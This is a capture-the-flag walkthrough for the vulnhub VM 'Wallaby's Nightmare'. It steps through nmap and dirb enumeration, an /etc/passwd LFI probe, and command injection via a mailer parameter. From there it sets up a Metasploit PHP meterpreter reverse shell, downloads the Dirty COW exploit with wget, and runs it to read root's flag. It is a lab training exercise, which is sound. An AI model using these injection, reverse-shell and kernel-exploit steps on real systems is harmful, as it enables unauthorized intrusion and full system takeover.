									Today we are going to solve Wallaby‚Äôs Nightmare CTF which is a new VM challenge of vulnhub where the attacker has to achieve root flag of the targeted VM machine; you can download it from here.
Table of Content

Network Scanning (Netdiscover, Nmap)
Abusing HTTP service for LFI Vulnerability
Web Directory Enumeration (Dirb)
Exploiting RCE (Metasploit)
Kernel Privilege Escalation

Let‚Äôs Begin!
As we always start from the network so that we can have a target IP. In your Kali Linux open the terminal and type netdiscover, now from the screenshot you can see a list of IP. Here 192.168.0.101 is my target IP.

Enumerate the target through aggressive scan; type following command for nmap scanning:

		
		
			
			
			
			
nmap -p- -A 192.168.0.101
			
				
					
				
					1
				
						nmap -p- -A 192.168.0.101
					
				
			
		

So here I found three¬†ports 22, 80, 6667¬†are¬†open.

Since port 80 is open I look toward browser and explore target IP 192.168.0.101 where I found a comment ‚Äúenter a username to get started with this CTF‚Äù then I type the name ‚ÄúRAJ‚Äù and click on submit so that we could move forward into start the game.

When I clicked on submit tab is linked to next web page where you can read the assigned username for this CTF from screenshot now we can start this CTF when we will click on given link start the CTF!

Next web page open with an exclusive warning that Mr. Wallaby found raj is trying to penetrate inside the server so user ‚Äúraj‚Äù is under his observation. Then soon after reading this threat, I observe at its URL I thought it might be vulnerable to etc/passwd same as LFI attack.

Then I try browse following in URL 192.168.1.101/?page=/etc/passwd though the web page stands up with raw data nothing was quite useful on this web page. And when I refresh it I lose connection from port 80. As raj was threatened by Wallaby üòâ¬†

Again I move toward nmap so that I can make sure about port 80 but here I found a new port 60080 is open for http service as you can perceive this thing from the given screenshot.

Then I next to my next tool dirb

		
		
			
			
			
			
dirb http://192.168.0.101:60080/?page=
			
				
					
				
					1
				
						dirb http://192.168.0.101:60080/?page=
					
				
			
		

Now from the screenshot, you can see the result and currently we will look toward highlighted directory.

So when I browse 192.168.0.101:60080/?page=mailer in URL the resultant web page gets opened and I found nothing special here except ‚Äúcoming soon, guys!‚Äù

Then I look after page source code to get some clue, here inside HTML code the anchor tag contains a link for another file which you can see from the screenshot.

Again I browse above highlighted text 192.168.0.101:60080/?mailer&amp;mail=pwd in URL and the web page comes outside with /var/www/html
Hence we can say that the current page might good for executing malicious comment as a command. ¬†

Now load Metasploit framework to connect with the victim through reverse connection

		
		
			
			
			
			
use exploit/multi/script/web_delivery
msf exploit¬†(web_delivery)&gt;set¬†target 1
msf exploit¬†(web_delivery)&gt;set payload php/meterpreter/reverse_tcp
msf exploit¬†(web_delivery)&gt;set lhost 192.168.0.106
msf exploit¬†(web_delivery)&gt;set lport 4444
msf exploit¬†(web_delivery)&gt;exploit
			
				
					
				
					123456
				
						use exploit/multi/script/web_deliverymsf exploit¬†(web_delivery)&gt;set¬†target 1msf exploit¬†(web_delivery)&gt;set payload php/meterpreter/reverse_tcpmsf exploit¬†(web_delivery)&gt;set lhost 192.168.0.106msf exploit¬†(web_delivery)&gt;set lport 4444msf exploit¬†(web_delivery)&gt;exploit
					
				
			
		

Now¬†copy¬†the generated command¬†php‚Ä¶.UvrG‚Äô));‚Äù¬†and send it to target

From the screenshot, you can see I have pasted above malicious PHP comment inside URL in hope to get a reverse connection inside Metasploit.

So when I execute this comment I receive meterpreter session and get connected with victim shell

		
		
			
			
			
			
meterpreter&gt; sysinfo
meterpreter&gt; shell
			
				
					
				
					12
				
						meterpreter&gt; sysinfometerpreter&gt; shell
					
				
			
		


Now use ‚ÄúDirty cow exploit‚Äù therefore type the following command to download this exploit inside tmp folder of the victim.

		
		
			
			
			
			
wget https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c
			
				
					
				
					1
				
						wget https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c
					
				
			
		


Now type the following command to compile your exploit so that it can run successfully inside.

		
		
			
			
			
			
gcc cowroot.c ‚Äìo cowroot -pthread
			
				
					
				
					1
				
						gcc cowroot.c ‚Äìo cowroot -pthread
					
				
			
		


Now we can run our exploit to achieve root permission and try to capture the flag

		
		
			
			
			
			
./cowroot
id
cd /root
ls
cat flag.txt
			
				
					
				
					12345
				
						./cowrootidcd /rootlscat flag.txt
					
				
			
		

Congratulation!!!¬†We have captured the flag which you can see from the screenshot and beat this task‚Ä¶‚Ä¶‚Ä¶..
